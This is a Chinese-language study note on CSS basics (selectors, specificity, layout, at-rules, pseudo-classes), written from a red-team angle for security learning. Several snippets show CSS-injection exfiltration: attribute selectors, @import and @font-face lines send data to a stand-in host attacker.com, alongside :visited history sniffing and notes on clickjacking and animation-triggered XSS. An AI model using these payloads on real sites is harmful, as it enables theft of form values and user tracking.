## 目录

- [[#一、CSS语法基础|一、CSS语法基础]]
- [[#二、选择器全套语法|二、选择器全套语法]]
- [[#三、优先级（Specificity）|三、优先级（Specificity）]]
- [[#四、盒模型与布局|四、盒模型与布局]]
- [[#五、CSS变量与自定义属性|五、CSS变量与自定义属性]]
- [[#六、@规则（At-rules）|六、@规则（At-rules）]]
- [[#七、伪类与伪元素|七、伪类与伪元素]]
- [[#八、红队视角总结|八、红队视角总结]]

---

## 一、CSS语法基础

```
选择器 {
  属性: 值;
  属性: 值;
}
```

三种引入方式：

**1. 外部样式表**
```html
<link rel="stylesheet" href="style.css">
```

**2. 内联样式**
```html
<div style="color: red; font-size: 16px;">
```

**3. 内部样式表**
```html
<style>
  body { background: #fff; }
  .container { max-width: 1200px; }
</style>
```

红队关注：内联样式是通过style属性注入CSS的入口。内部样式表是通过style标签注入的入口。

## 二、选择器全套语法

### 基础选择器

| 选择器 | 匹配目标 | 示例 |
|--------|---------|------|
| `*` | 所有元素 | `* { margin: 0 }` |
| `tag` | 标签名 | `div { }` |
| `.class` | class属性 | `.active { }` |
| `#id` | id属性 | `#login { }` |
| `[attr]` | 有某属性 | `[hidden] { }` |
| `[attr=val]` | 属性等于某值 | `[type="password"] { }` |

### 组合选择器

| 组合符 | 含义 | 示例 |
|--------|------|------|
| `A B` | A的后代B | `div p { }` |
| `A > B` | A的直接子B | `form > input { }` |
| `A + B` | A之后的兄弟B | `h2 + p { }` |
| `A ~ B` | A之后所有兄弟B | `h2 ~ p { }` |
| `A, B` | 并列 | `h1, h2 { }` |

### 属性选择器进阶

```css
[attr^="val"]     /* 以val开头 */
[attr$="val"]     /* 以val结尾 */
[attr*="val"]     /* 包含val */
[attr~="val"]     /* 包含独立单词val */
[attr|="val"]     /* val 或 val-开头 */

/* 红队应用：CSS注入中，利用 ^= 和 $= 判断属性值的前缀/后缀 */
input[value^="a"] { background: url('https://attacker.com/exfil?a'); }
input[value^="b"] { background: url('https://attacker.com/exfil?b'); }
/* 如果value以'a'开头，浏览器会请求 attacker.com/exfil?a */
/* 由此逐字符判断input的value属性 */
```

## 三、优先级（Specificity）

当多个规则冲突时，按优先级决定：

```
!important > 内联style > #id > .class/[attr]/:pseudo > tag
```

计算方式（(a, b, c, d)）：
- a = 1 如果有 `!important`
- b = ID选择器数量
- c = class/属性/伪类数量
- d = 标签/伪元素数量

```css
#login form input[type="text"]   /* (0,1,0,2) */
.login input                     /* (0,0,1,1) */
form input                       /* (0,0,0,2) */
```

红队应用：CSS注入时，利用`!important`覆盖原有样式，强制触发背景图请求。

## 四、盒模型与布局

### 盒模型

```
+-----------------------------+
|         margin              |
|  +-----------------------+  |
|  |       border          |  |
|  |  +-----------------+  |  |
|  |  |    padding      |  |  |
|  |  |  +----------+   |  |  |
|  |  |  | content  |   |  |  |
|  |  |  +----------+   |  |  |
|  |  +-----------------+  |  |
|  +-----------------------+  |
+-----------------------------+
```

关键属性：`width`, `height`, `padding`, `border`, `margin`, `box-sizing`

### 定位系统

| position值 | 参照物 | 脱离文档流 |
|-----------|--------|-----------|
| `static` | 默认，按文档流 | 否 |
| `relative` | 自身原位置 | 否（占位保留） |
| `absolute` | 最近的非static祖先 | 是 |
| `fixed` | 视口（viewport） | 是 |
| `sticky` | 滚动容器 | 否（切换时） |

### 显示与可见性

| 属性 | 效果 | 安全应用 |
|------|------|---------|
| `display: none` | 完全移除 | 隐藏钓鱼页面元素 |
| `visibility: hidden` | 不可见但占位 | 隐形元素点击劫持 |
| `opacity: 0` | 完全透明 | Clickjacking关键 |
| `z-index` | 层叠顺序 | 控制覆盖层次 |

## 五、CSS变量与自定义属性

```css
:root {
  --primary-color: #3366ff;
  --token: "abc123";  /* 不能存敏感值，CSS非安全存储 */
}

.button {
  background: var(--primary-color);
}
```

红队应用：
- CSS变量可以通过JS修改 → 动态样式 → 配合XSS
- CSS变量的值可被`getComputedStyle()`读取 → 数据通道
- CSS变量不应用作安全标记，因为可被任意注入的CSS覆盖

## 六、@规则（At-rules）

### @import（最重要！）

```css
/* 加载外部样式表 */
@import url('https://attacker.com/exfil');
@import 'https://attacker.com/exfil';

/* 条件加载 —— CSS数据泄露的核心！ */
@import url('https://attacker.com/exfil') (min-width: 1px);
```

### @media（媒体查询）

```css
@media (max-width: 768px) {
  .sidebar { display: none; }
}
@media (prefers-color-scheme: dark) { }
@media (hover: hover) { }
```

### @font-face（自定义字体）

```css
@font-face {
  font-family: 'MyFont';
  src: url('https://attacker.com/font?data=exfiltrated');
}
```

### @keyframes（动画）

```css
@keyframes spin {
  from { transform: rotate(0deg); }
  to { transform: rotate(360deg); }
}
/* 结合onanimationend实现无需用户交互的XSS触发 */
```

### @supports（特性检测）

```css
@supports (display: grid) {
  /* CSS Grid 可用 */
}
```

## 七、伪类与伪元素

### 交互伪类

| 伪类 | 触发 | 安全应用 |
|------|------|---------|
| `:hover` | 鼠标悬停 | 悬停触发请求外泄 |
| `:focus` | 获得焦点 | 输入框聚焦探测 |
| `:active` | 按下时 | 点击行为记录 |
| `:visited` | 已访问链接 | 浏览器历史探测（已被限制） |

### 结构伪类

| 伪类 | 匹配 | 安全应用 |
|------|------|---------|
| `:first-child` | 第一个子元素 | 页面结构探测 |
| `:nth-child(n)` | 第n个 | 精确定位元素 |
| `:empty` | 无子元素 | 空元素探测 |

### 表单伪类

| 伪类 | 匹配 | 安全应用 |
|------|------|---------|
| `:checked` | 选中的复选框/单选框 | 状态探测 |
| `:disabled` | 禁用的表单元素 | 功能探测 |
| `:required` | 必填字段 | 表单结构探测 |
| `:valid/:invalid` | 有效/无效输入 | 验证状态探测 |

### 历史探测（:visited）

```css
/* 经典浏览器历史嗅探（现代浏览器已限制） */
a:visited { background: url('https://attacker.com/visited'); }
/* 检测用户是否访问过某URL */
```

现代浏览器已严格限制`:visited`可用的CSS属性（仅允许color系列），防止信息泄露。

## 八、红队视角总结

### CSS基础速查

| CSS概念 | 红队用途 |
|---------|---------|
| 属性选择器 | 根据属性值发起外泄请求 |
| @import | 跨域加载，传递数据 |
| @font-face | 通过字体URL外泄数据 |
| @keyframes | 配合onanimationend实现无交互XSS触发 |
| opacity/position/z-index | Clickjacking布局 |
| `!important` | 覆盖原有样式，确保payload生效 |
| `:hover` `:focus` | 用户行为探测 |

### 对应工具

- **Chrome DevTools**：Styles面板查看/修改CSS
- **CSS Injection Scanner**（Burp插件）
- **CSS Exfil PoC**：手动构造payload测试CSS数据泄露

---
**返回** [[CSS基础总目录|CSS基础总目录]] | [[../前端基础总目录|前端基础总目录]]
